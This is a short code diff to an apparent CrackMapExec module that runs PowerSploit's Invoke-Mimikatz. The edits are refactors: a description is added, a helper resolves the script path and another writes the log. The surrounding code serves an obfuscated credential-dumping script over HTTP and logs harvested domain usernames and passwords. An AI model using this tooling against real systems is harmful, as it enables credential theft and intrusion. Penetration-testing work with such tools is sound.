@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, obfs_ps_script, gen_random_string, validate_ntlm
+from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, gen_random_string, validate_ntlm, write_log
 from datetime import datetime
 import re
 
@@ -8,7 +8,9 @@ class CMEModule:
         Module by @byt3bl33d3r
     '''
 
-    name = 'Mimikatz'
+    name = 'mimikatz'
+
+    description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"
 
     def options(self, context, module_options):
         '''
@@ -53,7 +55,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open('data/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1', 'r') as ps_script:
+            with open(get_ps_script('Exfiltration/Invoke-Mimikatz.ps1'), 'r') as ps_script:
                 ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                 request.wfile.write(ps_script)
 
@@ -213,6 +215,5 @@ class CMEModule:
                     context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
             log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
-            with open('logs/' + log_name, 'w') as mimikatz_output:
-                mimikatz_output.write(data)
+            write_log(data, log_name)
             context.log.info("Saved Mimikatz's output to {}".format(log_name))
